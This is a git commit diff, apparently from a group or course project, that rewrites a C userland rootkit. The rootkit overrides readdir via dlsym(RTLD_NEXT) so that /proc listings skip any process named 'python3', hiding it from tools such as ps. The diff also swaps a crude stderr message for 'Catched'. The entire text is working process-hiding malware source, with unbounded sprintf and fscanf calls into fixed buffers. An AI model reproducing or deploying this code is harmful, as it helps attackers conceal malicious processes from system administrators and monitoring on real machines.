190c231dc5eb18173c0fd4372039ae574652faa7
rednaxela95 <troeger-alexander@outlook.de>
2023-12-11 10:51:45 +0100

    Fix rootkit.c

--- utils/rootkit.c
+++ utils/rootkit.c
@@ -7,51 +7,44 @@
 #include <string.h>
 #include <sys/stat.h>
 
-#define NUM_NAMES 3
-const char *HIDE_NAMES[NUM_NAMES] = {"test", "python3", "secret.sh"}; 
+#define NAME "python3"
 
 static struct dirent *(*old_readdir) (DIR *) = NULL;
 
-int should_hide_process(const char *process_name) {
-    for (int i = 0; i < NUM_NAMES; i++) {
-        if (strcmp(process_name, HIDE_NAMES[i]) == 0) {
-            return 1;  
-        }
-    }
-    return 0; 
-}
+struct dirent *readdir (DIR * dirp) {
+	if (old_readdir == NULL) {
+		old_readdir = dlsym(RTLD_NEXT, "readdir");
+		if (old_readdir == NULL) 
+			error(1, errno, "dlsym");
 
-struct dirent *readdir(DIR *dirp) {
-    if (old_readdir == NULL) {
-        old_readdir = dlsym(RTLD_NEXT, "readdir");
-        if (old_readdir == NULL) {
-            error(1, errno, "dlsym");
-        }
+		fprintf(stderr, "Catched\n");		
+	}
+	
+	struct dirent * direntp ;
+	while (( direntp = old_readdir ( dirp ) ) != NULL ) {
 
-        fprintf(stderr, "Fucked by Group7\n");
-    }
-
-    struct dirent *direntp;
-    while ((direntp = old_readdir(dirp)) != NULL) {
-        if (direntp->d_type == DT_DIR) {
-            char proc[300], name[80];
-            FILE *comm;
-
-            snprintf(proc, sizeof(proc), "/proc/%s/comm", direntp->d_name);
-            comm = fopen(proc, "r");
-            if (comm == NULL) continue;
-
-            if (fgets(name, sizeof(name), comm) != NULL) {
-                name[strcspn(name, "\n")] = 0;
-                
-                if (should_hide_process(name)) {
-                    fclose(comm);
-                    continue;  
-                }
-            }
-            fclose(comm);
-        }
-        break;
-    }
-    return direntp;
+		char proc[300];
+		
+		struct stat sb;
+		sprintf(proc, "/proc/%s", direntp->d_name);
+		if (stat(proc, &sb) == -1) break;
+		
+		int proc_inode = sb.st_ino;
+		if (direntp->d_ino != proc_inode) {
+			break;
+		}
+		
+		sprintf(proc, "/proc/%s/comm", direntp->d_name);
+		FILE *comm;
+		comm = fopen(proc, "r");
+		if (comm == NULL) break;
+		
+		char name[80];
+		fscanf(comm, "%s", name);
+		fclose(comm);
+		
+		if (strcmp(NAME, name) == 0) continue;
+		else break;		
+	} 
+	return (direntp);
 }
